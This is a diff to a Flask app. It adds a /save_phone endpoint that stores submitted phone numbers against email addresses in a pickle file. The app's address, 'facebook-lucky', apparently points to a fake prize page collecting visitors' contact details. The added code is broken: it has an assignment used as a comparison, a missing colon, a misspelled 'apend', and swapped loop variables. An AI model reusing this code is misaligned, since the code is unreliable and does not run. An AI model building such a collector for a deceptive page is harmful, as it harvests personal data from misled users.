@@ -40,6 +40,21 @@ def store_info():
         PickleDumpLoad().save_config(data_fix, 'database.pickle')
     return jsonify({"status":"ok"}), 200
 
+@app.route('/save_phone', methods=['POST'])
+def store_phone():
+    data = request.get_json()   
+    phone = data['phone']
+    email = data['email'] 
+    load_data_fix = PickleDumpLoad().load_config("database.pickle")
+    get_uid = []
+    for val, key in load_data_fix.items():
+        if val['email'] = email
+            get_uid.apend(key)
+    for key in get_uid:
+        load_data_fix[key]['phone'] = phone
+    PickleDumpLoad().save_config(load_data_fix, 'database.pickle')
+    return jsonify({"status":"ok"}), 200
+
 # ACCESS THE PAGE: https://facebook-lucky.herokuapp.com/info?source=source
 @app.route('/info', methods=['GET'])
 def get_data():
